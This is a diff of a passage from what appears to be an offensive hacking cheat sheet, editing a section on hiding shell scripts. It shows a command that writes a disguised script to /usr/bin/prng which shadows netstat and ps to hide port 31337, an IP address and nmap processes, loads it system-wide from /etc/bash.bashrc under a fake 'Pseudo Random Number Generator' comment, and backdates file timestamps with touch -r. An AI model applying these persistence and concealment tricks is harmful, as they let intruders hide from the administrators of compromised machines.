@@ -206,7 +206,7 @@ hide nohup sleep 1234 &>/dev/null &  # Starts and hides 'sleep 1234' as a backgr
 <a id="hide-scripts"></a>
 **1.vii. Hide shell scripts**
 
-Above we discussed how to obfuscate a line in ~/.bashrc. An often used trick is to use `source` instead. It is little known that the source command can she shortened to `.` (yes, a dot) _and_ searches through the $PATH variable to find the file to load.
+Above we discussed how to obfuscate a line in ~/.bashrc. An often used trick is to use `source` instead. The source command can be shortened to `.` (yes, a dot) _and_ it also searches through the $PATH variable to find the file to load.
 
 In this example our script ```prng``` contains all of our shell functions from above. Those functions hide the `nmap` process and the network connection. Last we add `. prng` into the systemwide rc file. This will load `prng` when the user (and root) logs in:
 
@@ -214,7 +214,7 @@ In this example our script ```prng``` contains all of our shell functions from a
 echo -e "netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }
 ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }" >/usr/bin/prng \
 && echo ". prng #Initialize Pseudo Random Number Generator" >>/etc/bash.bashrc \
-&& touch -r /etc/ld.so.conf /etc/bash.bashrc
+&& touch -r /etc/ld.so.conf /usr/bin/prng /etc/bash.bashrc
 ```
 
 (The same works for `lsof`, `ss` and `ls`)
